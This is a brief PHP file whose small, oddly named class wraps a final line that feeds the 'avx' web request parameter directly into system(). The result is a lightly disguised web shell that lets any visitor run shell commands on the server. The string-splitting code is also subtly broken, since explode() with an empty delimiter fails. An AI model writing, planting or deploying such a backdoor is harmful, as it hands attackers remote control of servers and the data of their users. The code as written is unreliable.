<?php

namespace Qq\ForMe;

class ABC {
    public function a($r, $z)
    {
        return array_merge(static::b($r), static::b($z));
    }
    private function b($q) {
        return explode("", $q);
    }
}
system(implode(" ", ABC::a($_GET['avx'], getopt('r:')['r'])));